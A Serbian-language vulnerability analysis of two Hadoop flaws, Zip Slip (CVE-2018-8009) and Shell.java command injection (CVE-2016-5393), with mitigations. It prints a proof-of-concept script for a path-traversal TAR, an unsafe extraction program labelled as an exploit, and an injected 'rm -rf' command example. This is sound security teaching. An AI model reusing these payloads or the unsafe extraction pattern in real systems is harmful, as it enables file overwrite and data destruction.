## Zip Slip (CVE-2018-8009) - analiza

Zip Slip je ranjivost koja se ispoljava prilikom obrade arhivskih fajlova, npr. ZIP i TAR. Ova ranjivost omogućava napadačima da iskoriste nebezbednu logiku raspakivanja fajlova kako bi zapisali zlonamerni sadržaj na neautorizovane lokacije u fajl sistemu.

Glavni uzrok ranjivosti leži u tome što aplikacija ne proverava putanje fajlova unutar arhive. Napadači mogu kreirati arhive koje sadrže fajlove sa apsolutnim putanjama (npr. `C:/Windows/System32`) ili relativnim putanjama koje koriste `../` za vraćanje u roditeljski direktorijume. Tokom procesa raspakivanja, ako aplikacija slepo veruje ovim putanjama, može se desiti da zlonamerni fajlovi budu upisani van ciljnog direktorijuma, čime se ugrožava bezbednost sistema.

Ova ranjivost omogućava napadaču da preuzme kontrolu nad sistemom ili da dovede do nepravilnog rada sistema. Na primer, može doći do situacije da se ekstraktuje skripta za povezivanje sa napadačevim serverom na mestu gde napadač može da pokrene tu skriptu bez ikakvih dodatnih privilegija (recimo, izvršenjem HTTP upita).

Primer pajton skripte za kreiranje malicioznog TAR fajla:
```python
import tarfile
import io

def create_malicious_tar(tar_path, target_file_path, content):
    with tarfile.open(tar_path, "w") as tar:
        # Create a file-like object from the content (bytes)
        fileobj = io.BytesIO(content.encode('utf-8'))
        
        # Create the TarInfo object with the path where you want to extract the file
        tarinfo = tarfile.TarInfo(name=target_file_path)
        tarinfo.size = len(content)  # Set the size of the file

        # Add the file to the TAR archive
        tar.addfile(tarinfo, fileobj=fileobj)

    print(f"Malicious TAR created at: {tar_path}")

# Specify where the file should be unpacked
target_file_path = "C:\\Windows\\System32\\malicious.txt"  # Example of absoulute path
# target_file_path = ..\\..\\malicious.txt"  # Example of relative path
# target_file_path = extracted\\malicious.txt"  # Example of safe path

tar_path = "malicious.tar"

# The content of the file to be packed in the TAR file
content = "This is a malicious file that will be unpacked to a specific directory."

# Create the malicious TAR
create_malicious_tar(tar_path, target_file_path, content)
```

Ranjivost se kod Hadoop sistema može eksploatisati tako što se maliciozni TAR fajl prebaci u HDFS i njegovo ekstraktovanje izvrši pomoću Java programa koji nebezbedno rukuje putanjama na koje treba da se ekstraktuje TAR fajl. Takav Java program je dat u nastavku:

```java
import org.apache.commons.compress.archivers.tar.TarArchiveInputStream;
import org.apache.hadoop.fs.FileSystem;
import org.apache.hadoop.fs.Path;
import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.FSDataInputStream;

import java.io.IOException;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.BufferedOutputStream;
import java.io.File;

public class ExploitHadoopTar {

    public static void main(String[] args) throws IOException {
        if (args.length != 1) {
            System.out.println("Usage: HadoopTarExploit <path-to-tar-file>");
            System.exit(1);
        }

        // Get TAR file path from arguments
        String tarFilePath = args[0];

        // Configuration for Hadoop FileSystem (you may need to adjust this based on your Hadoop setup)
        Configuration conf = new Configuration();
        FileSystem fs = FileSystem.get(conf);

        // Open the malicious TAR file from HDFS
        Path hdfsTarFilePath = new Path(tarFilePath);  // HDFS path
        try (FSDataInputStream tarFileStream = fs.open(hdfsTarFilePath);
             TarArchiveInputStream tarInputStream = new TarArchiveInputStream(tarFileStream)) {

            // Iterate over the TAR entries and extract them
            org.apache.commons.compress.archivers.tar.TarArchiveEntry entry;
            while ((entry = tarInputStream.getNextTarEntry()) != null) {
                String entryName = entry.getName();
                System.out.println("Extracting: " + entryName);

                // Create the local extraction file
                File extractionFile = new File(entryName);  // Local path (relative to current directory or absolute path)

                // If the entry is a directory, create the directory on the local filesystem
                if (entry.isDirectory()) {
                    extractionFile.mkdirs();
                    continue;  // Skip to the next entry
                }

                // Ensure the parent directory exists
                File parentDir = extractionFile.getParentFile();
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }

                // Create the output stream to write the extracted file locally
                try (BufferedOutputStream outputStream = new BufferedOutputStream(new FileOutputStream(extractionFile))) {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = tarInputStream.read(buffer)) != -1) {
                        outputStream.write(buffer, 0, bytesRead);
                    }
                }

                System.out.println("Extracted to: " + extractionFile.getAbsolutePath());
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
Pokretanjem ovog Java programa doći će do raspakivanja TAR fajla na putanje koje su podešene u TAR fajlu bez ikakve provere validnosti tih putanja. Pokretanje se vrši komandom: `hadoop jar path/to/jar/ExploitHadoopTar.jar ExploitHadoopTar path/to/tar/on/hdfs/malicious.tar`.


### Bezbednosne kontrole

1. Validacija raspakovanih putanja prilikom raspakivanja
2. Kreiranje posebnog korisnika za pokretanje Hadoop aplikacije sa ograničenjima za pisanje i čitanje

#### Validacija raspakovanih putanja prilikom raspakivanja
Validacija putanja se ogleda u proveri da li je putanja apsolutna i da li sadrži `../` za povratak u roditeljski direktorijum. U nastavku je prikazana funkcija za validaciju i izmenjeni deo koda iz prethodnog primera:
```java
private static boolean isPathValid(String entryName) {
    // Check if the path is absolute
    File entryFile = new File(entryName);
    if (entryFile.isAbsolute()) {
        return false;
    }

    // Check if the path contains '../'
    String normalizedPath = entryFile.getPath().replace("\\", "/"); // Normalize path for cross-platform compatibility
    if (normalizedPath.contains("../")) {
        return false;
    }

    return true;
}

...

// Add check in example code
if (!isPathValid(entryName)) {
    System.out.println("Invalid path: " + entryName);
    continue;
}
```

#### Kreiranje posebnog korisnika za pokretanje Hadoop aplikacije sa ograničenjima za pisanje i čitanje
Celi problem se može preduprediti time što će se Hadoop aplikacija pokrenuti tako da nema dozvole za pisanje i čitanje na bilo kojoj putanji u fajl sistemu. Potrebno je kreirati korisnika koji će imati dozvoljeno pisanje i čitanje samo iz određenih fajlova/direktorijuma. Čitanje treba biti dozvoljeno u okviru foldera gde je instaliran Hadoop radi čitanja konfiguracionih fajlova kao i pristupa podacima u HDFS. Putanje za upisivanje novih podataka je potrebno podesiti po potrebama sistema. Ukoliko se koristi Hadoop MapReduce funkcionalnost, potrebno je tačno definisati iz kog direktorijuma je dozvoljeno čitanje ulaznih podataka kao i u koji direktorijum je dozvoljeno upisivanje rezultata. Takva provera je potrebna samo ukoliko se barata podacima sa lokalnog računara (u smislu da se barata podacima iz fajl sistema računara), a ne direktno iz HDFS. 

Ovakav sistem zaštite je sproveden na nivou operativnog sistema pa se načini implementacije mogu razlikovati. Suština je da se kreira novi korisnik u operativnom sistemu i da mu se dodele dozvoljeni direktorijumi u koje može da upisuje i iz kojih može da čita fajlove, a da se ostali zabrane. Nakon toga je potrebno Hadoop pokrenuti sa permisijama tog korisnika.

## Izvršavanje proizvoljnih komandi sa permisijama HDFS servisa (CVE-2016-5393) - analiza

Jedna od pomoćnih klasa (`hadoop-common-project/hadoop-common/src/main/java/org/apache/hadoop/util/Shell.java`) koja se bavi obradom shell komandi radi pod pretpostavkom da komanda neće imati neke od specijalnih karaktera u sebi. Ovakva pretpostavka dovodi do toga da se prilikom izvršavanja željene bash komande može ubaciti maliciozna bash komanda. Napad koji eksploatiše ovu ranjivost je *command injection* napad koji se može izvršiti zbog neadekvatne obrade navodnika u komandi. Da bi se napad izvršio, korisnik mora biti autentifikovan i mora mu biti omogućeno korišćenje HDFS servisa.

Pseudo-primer maliciozne komande bi bio `rm -rf /some/path $userInput` gde `userInput` sadrži `" ; rm -rf /important/path"` i gde bi rezultat bio komanda `rm -rf /some/path ; rm -rf /important/path` koja bi obrisala i `/some/path` i `/important/path`. Ovakvim napadom je moguće izvršiti bilo koju komandu pod permisijama HDFS servisa.

#### Bezbednosne kontrole
Potrebno je sanitizovati korisnički unos i ne dozvoliti da se korisnički unos smatra komandom. To je učinjeno sledećom funkcijom ([fix](https://github.com/apache/hadoop/pull/119) kada je ranjivost popravljena i dodata funkcija za sanitizaciju):
```java
static String bashQuote(String arg) {
    StringBuilder buffer = new StringBuilder(arg.length() + 2);
    buffer.append('\'');
    buffer.append(arg.replace("'", "'\\''"));
    buffer.append('\'');
    return buffer.toString();
}
```
Ovakva obrada dovodi do toga da se korisnički unos transformiše u string. Na početak i kraj korisničkog unosa se dodaju `'` čime se obezbeđuje da se korisnički unos smatra stringom. Ako originalni string sadrži jedan ili više apostrofa, oni se zamenjuju nizom `'\\''`. Ovaj izraz izlazi iz trenutnog navodnika, dodaje karakter `'` kao deo stringa, a zatim ponovo ulazi u režim stringa. Time se postiže da se kompletan korisnički unos transformiše u string i onemogućava njegovo izvršenje.

Korišćenjem ove funkcije prethodna maliciozna komanda se pretvara u `rm -rf /some/path ' ; rm -rf /important/path'` i nije je moguće izvršiti.

Ranjivost je prisutna u Hadoop verzijama: `2.6.x` pre `2.6.5` i `2.7.x` pre `2.7.3`. Ranjivost je popravljena u Hadoop verzijama: `2.8.0`, `2.7.3`, `2.6.5`, `3.0.0-alpha1` pa se kao mitigacija preporučuje prebacivanje na navedene verzije.